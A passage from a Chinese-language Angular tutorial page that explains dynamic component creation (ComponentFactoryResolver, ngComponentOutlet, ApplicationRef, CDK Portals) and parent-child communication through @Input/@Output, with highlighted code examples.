</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>同样我们也可以订阅组件的输出属性，具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>output<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">event</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>另外不能忘记销毁组件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngOnDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ol start="4"><li>最后我们需要将动态组件添加到 NgModule 的 entryComponents 属性中：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token operator">...</span><span class="token punctuation">,</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">,</span> AlertComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  entryComponents<span class="token operator">:</span> <span class="token punctuation">[</span>AlertComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h4 id="实例2："><a href="#实例2：" class="header-anchor">#</a> 实例2：</h4> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- 组件 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>wmodal</span> <span class="token attr-name">[content]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>comp<span class="token punctuation">&quot;</span></span> <span class="token attr-name">[compParams]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>{data: '我是调用wmodal传入的值'}<span class="token punctuation">&quot;</span></span> <span class="token attr-name">(compOut)</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>wmodalOut($event)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>wmodal</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 模板 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>wmodal</span> <span class="token attr-name">[content]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>modalTpl<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>wmodal</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-template</span> <span class="token attr-name">#modalTpl</span> <span class="token attr-name">let-data</span> <span class="token attr-name">let-other</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>other<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  data: {{data | json}} <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
  other: {{other}}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-template</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>在wmodal内需要做点什么呢？首先是html</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>// 占个位，这里我要放传入的模板或组件了
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-template</span> <span class="token attr-name">#container</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-template</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>接着是wmodal的ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngAfterContentInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 依然是判断content类型</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content <span class="token keyword">instanceof</span> <span class="token class-name">Type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> comp <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_compFac<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将组件所需参数合并到组件实例中</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>compParams<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>instance<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>compParams<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 订阅组件</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> prop <span class="token keyword">in</span> comp<span class="token punctuation">.</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>comp<span class="token punctuation">.</span>instance<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> subject <span class="token operator">=</span> comp<span class="token punctuation">.</span>instance<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">// 筛选组件output事件</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>subject <span class="token keyword">instanceof</span> <span class="token class-name">EventEmitter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>_compSubs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>
            <span class="token comment">// 订阅组件output事件</span>
            subject<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>compOut<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment">// 创建模板就比较简单了</span>
    <span class="token comment">// 留意一下第二个参数，若是需要将组建的某些数据传出则可以这样</span>
    <span class="token keyword">const</span> _data <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token punctuation">{</span>$implicit<span class="token operator">:</span> _data<span class="token punctuation">,</span> other<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><h4 id="动态加载组件流程"><a href="#动态加载组件流程" class="header-anchor">#</a> 动态加载组件流程</h4> <ul><li>获取装载动态组件的容器</li> <li>在组件类的构造函数中，注入 ComponentFactoryResolver 对象</li> <li>调用 ComponentFactoryResolver 对象的 resolveComponentFactory() 方法创建 ComponentFactory 对象</li> <li>调用组件容器对象的 createComponent() 方法创建组件并自动添加动态组件到组件容器中</li> <li>基于返回的 ComponentRef 组件实例，配置组件相关属性 (可选)</li> <li>在模块 Metadata 对象的 entryComponents 属性中添加动态组件
<ol><li>declarations - 用于指定属于该模块的指令和管道列表</li> <li>entryComponents - 用于指定在模块定义时，需要编译的组件列表。对于列表中声明的每个组件，Angular 将会创建对应的一个 ComponentFactory 对象，并将其存储在 ComponentFactoryResolver 对象中</li></ol></li></ul> <p>通过 ComponentFactoryResolver 对象，我们实现了动态创建组件的功能。但创建的过程还是有点繁琐，为了提高开发者体验和开发效率，Angular 引入了 ngComponentOutlet 指令。</p> <h3 id="使用ngcomponentoutlet"><a href="#使用ngcomponentoutlet" class="header-anchor">#</a> 使用ngComponentOutlet</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>wtable <span class="token punctuation">[</span>columns<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;['姓名','年龄']&quot;</span> <span class="token punctuation">[</span>rows<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;[{name: 'ww', age: 11}, {name:'yy', age: 22}]&quot;</span> <span class="token punctuation">[</span>cellContent<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;custom&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>wtable<span class="token operator">&gt;</span>
 <span class="token operator">&lt;</span>ng<span class="token operator">-</span>template #custom <span class="token keyword">let</span><span class="token operator">-</span>data <span class="token keyword">let</span><span class="token operator">-</span>column<span class="token operator">=</span><span class="token string">&quot;column&quot;</span> <span class="token keyword">let</span><span class="token operator">-</span>row<span class="token operator">=</span><span class="token string">&quot;row&quot;</span> <span class="token keyword">let</span><span class="token operator">-</span>index<span class="token operator">=</span><span class="token string">&quot;index&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 在这里就可以获取数据搞事情啦 <span class="token operator">--</span><span class="token operator">&gt;</span>
    <span class="token punctuation">{</span><span class="token punctuation">{</span>column<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
    <span class="token punctuation">{</span><span class="token punctuation">{</span>index<span class="token punctuation">}</span><span class="token punctuation">}</span> 行<span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
    行数据： <span class="token punctuation">{</span><span class="token punctuation">{</span>row <span class="token operator">|</span> json<span class="token punctuation">}</span><span class="token punctuation">}</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
<span class="token comment">// wtable组件的html</span>
<span class="token operator">&lt;</span>tbody<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>tr <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">&quot;let row of rows;index as i;&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>td <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">&quot;let cell of row | keyvalue&quot;</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 模板 <span class="token operator">--</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;tpl&quot;</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngTemplateOutlet<span class="token operator">=</span><span class="token string">&quot;tpl; context:outCellContext(cell.key, cell.value, row, i);&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 组件不太好用 <span class="token operator">--</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;comp&quot;</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngComponentOutlet<span class="token operator">=</span><span class="token string">&quot;comp&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>td<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>tr<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>tbody<span class="token operator">&gt;</span>
<span class="token comment">// wtable组件ts</span>
<span class="token comment">// 此处为内部变量传递给外部模板使用，所需的数据</span>
  <span class="token function">outCellContext</span><span class="token punctuation">(</span><span class="token parameter">cellKey<span class="token punctuation">,</span> cellValue<span class="token punctuation">,</span> row<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>
      $implicit<span class="token operator">:</span> cellValue<span class="token punctuation">,</span> <span class="token comment">// 默认传出cellValue数据</span>
      column<span class="token operator">:</span> cellKey<span class="token punctuation">,</span> <span class="token comment">// 指定字段</span>
      row<span class="token operator">:</span> row<span class="token punctuation">,</span> <span class="token comment">// 行数据</span>
      index<span class="token operator">:</span> index <span class="token comment">// 行索引</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><h3 id="使用applicationref"><a href="#使用applicationref" class="header-anchor">#</a> 使用ApplicationRef</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>wmodal2 <span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;comp&quot;</span> <span class="token punctuation">[</span>compParams<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;{data: '我是调用wmodal2传入的值'}&quot;</span> <span class="token punctuation">(</span>compOut<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;wmodalOut($event)&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>wmodal2<span class="token operator">&gt;</span>
<span class="token comment">// wmodal2 html</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 什么都没有 <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token comment">// wmodal2 ts</span>
<span class="token function">ngAfterContentInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 所有带_前缀是直接注入</span>
  <span class="token keyword">const</span> comp <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_compFaRes<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_injector<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>_e<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>location<span class="token punctuation">.</span>nativeElement<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 此处与第2点一样，订阅output和给input赋值</span>

  <span class="token comment">// 去掉timeout你就知道为什么了</span>
  <span class="token comment">// 具体原因可以看我专栏的的第一篇文章</span>
  <span class="token keyword">const</span> timeId <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_appref<span class="token punctuation">.</span><span class="token function">attachView</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeId<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="使用-portals"><a href="#使用-portals" class="header-anchor">#</a> 使用 Portals</h3> <p>1.第一步：同样是设置一个宿主元素用于渲染动态组件，可以使用指令cdkPortalOutlet挂载一个PortalOutlet在这个ng-container元素上</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>portals-outlet<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-container</span> <span class="token attr-name">#virtualContainer</span> <span class="token attr-name">cdkPortalOutlet</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-container</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="2"><li>第二步：获取容器的类型是CdkPortalOutlet的宿主</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'virtualContainer'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> read<span class="token operator">:</span> CdkPortalOutlet <span class="token punctuation">}</span><span class="token punctuation">)</span>
virtualPotalOutlet<span class="token operator">:</span> CdkPortalOutlet<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="3"><li>第三步：创建一个ComponentPortal类型的Portal，并且将它附加上面获取的宿主virtualPotalOutlet上，代码如下</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">portalOpenTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>virtualPotalOutlet<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> taskDetailCompoentPortal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComponentPortal</span><span class="token operator">&lt;</span>TaskDetailComponent<span class="token operator">&gt;</span><span class="token punctuation">(</span>
      TaskDetailComponent
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> ref <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>virtualPotalOutlet<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>taskDetailCompoentPortal<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 此处同样可以 通过ref.instance传递task参数</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>这里是使用ComponentPortal的示例实现动态创建组件，Portal还有一个子类TemplatePortal是针对模板实现的</p></div> <h2 id="组件通信"><a href="#组件通信" class="header-anchor">#</a> 组件通信</h2> <h3 id="input-output-2"><a href="#input-output-2" class="header-anchor">#</a> @Input/@Output</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// counter.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> Output<span class="token punctuation">,</span> EventEmitter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;当前值: {{ count }}&lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    @<span class="token function">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span> change<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>change<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">decrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>change<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;p&gt;{{changeMsg}}&lt;/p&gt; 
   &lt;exe-counter [count]=&quot;initialCount&quot; 
    (change)=&quot;countChange($event)&quot;&gt;&lt;/exe-counter&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  initialCount<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  changeMsg<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">countChange</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>changeMsg <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">子组件change事件已触发，当前值是: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>event<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br></div></div><h3 id="模板变量"><a href="#模板变量" class="header-anchor">#</a> 模板变量</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// child.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
